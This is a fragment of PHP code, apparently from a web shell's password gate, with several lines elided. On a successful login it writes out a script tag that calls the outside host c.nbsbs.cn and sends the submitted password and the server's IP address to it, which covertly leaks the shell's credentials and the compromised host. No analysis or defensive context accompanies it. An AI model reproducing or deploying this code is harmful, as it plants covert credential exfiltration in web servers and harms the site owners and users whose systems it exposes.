...
$site="<script src=http://c.nbsbs.cn/api.php?pass={$_POST[silicpass]}&ip={$Server_IP}></script>";
...
if($_COOKIE['admin_silicpass'] != md5($password))
{
	...
	if(isset($passt))
	{
		...
		if(md5($passt) == md5($password)){echo $site ;die('<meta http-equiv="refresh" content="1;URL=?">');}
